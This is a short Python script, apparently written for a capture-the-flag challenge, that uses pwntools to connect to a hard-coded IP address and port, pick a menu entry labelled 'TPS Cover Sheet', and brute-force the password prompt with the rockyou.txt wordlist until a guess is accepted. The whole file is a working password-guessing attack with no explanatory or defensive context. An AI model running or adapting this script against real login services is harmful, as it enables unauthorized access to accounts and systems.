from pwn import remote, log, context
import concurrent.futures


def connect():
    c = remote('161.35.239.216', 5000)
    c.recvuntil(b'TPS Cover Sheet')
    c.sendline(b'1')
    c.recvuntil(b'TPS-XXXX):\n')
    c.sendline(b'TPS-8352')
    c.recvuntil(b'password\n')
    return c

c = connect()

i = 0
with open('./rockyou.txt') as f:
    while True:
        i += 1
        next_pass = f.readline().strip()
        print('attempt ' + str(i) + ', sending: ' + next_pass)
        c.sendline(next_pass.encode())

        if c.recvline() == b'Wrong\n':
            #print("bummer!")
            c.recvline()
            c.recvline()
        else:
            print("..?")
            #print(c.recvline())
            print(c.recvall())